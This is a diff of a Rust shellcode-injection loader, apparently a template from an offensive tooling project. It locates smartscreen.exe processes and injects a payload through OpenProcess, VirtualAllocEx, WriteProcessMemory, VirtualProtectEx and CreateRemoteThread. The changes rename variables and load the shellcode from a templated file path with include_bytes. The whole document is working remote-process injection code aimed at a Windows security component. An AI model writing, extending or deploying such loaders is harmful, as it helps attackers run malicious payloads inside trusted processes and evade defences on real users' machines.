@@ -6,6 +6,7 @@ use windows::Win32::System::Memory::{MEM_COMMIT, PAGE_EXECUTE_READ, PAGE_READWRI
 use windows::Win32::System::Threading::CreateRemoteThread;
 use windows::Win32::System::Threading::OpenProcess;
 use windows::Win32::System::Threading::PROCESS_ALL_ACCESS;
+use std::include_bytes;
 
 fn boxboxbox(tar: &str) -> Vec<u32> {
     // search for processes to inject into
@@ -22,29 +23,29 @@ fn enhance(buf: &[u8], tar: &u32) {
     // injecting in target processes :)
 
     unsafe {
-        let hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
-        let resultPtr = VirtualAllocEx(hProcess, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
+        let h_process = OpenProcess(PROCESS_ALL_ACCESS, false, *tar).unwrap();
+        let result_ptr = VirtualAllocEx(h_process, None, buf.len(), MEM_COMMIT, PAGE_READWRITE);
         let mut byteswritten = 0;
         let _resb = WriteProcessMemory(
-            hProcess,
-            resultPtr,
+            h_process,
+            result_ptr,
             buf.as_ptr() as _,
             buf.len(),
             Some(&mut byteswritten),
         );
         let mut old_perms = PAGE_EXECUTE_READ;
         let _bool = VirtualProtectEx(
-            hProcess,
-            resultPtr,
+            h_process,
+            result_ptr,
             buf.len(),
             PAGE_EXECUTE_READ,
             &mut old_perms,
         );
-        let _resCRT = CreateRemoteThread(
-            hProcess,
+        let _res_crt = CreateRemoteThread(
+            h_process,
             None,
             0,
-            Some(std::mem::transmute(resultPtr)),
+            Some(std::mem::transmute(result_ptr)),
             None,
             0,
             None,
@@ -57,13 +58,13 @@ fn main() {
     // inject in the following processes:
     let tar: &str = "smartscreen.exe";
 
-    let buf: Vec<u8> = vec!{{shellcode}};
+    let buf = include_bytes!({{PATH_TO_SHELLCODE}});
     let list: Vec<u32> = boxboxbox(tar);
     if list.len() == 0 {
         panic!("[-] Unable to find a process.")
     } else {
         for i in &list {
-            enhance(&buf, i);
+            enhance(buf, i);
         }
     }
 }
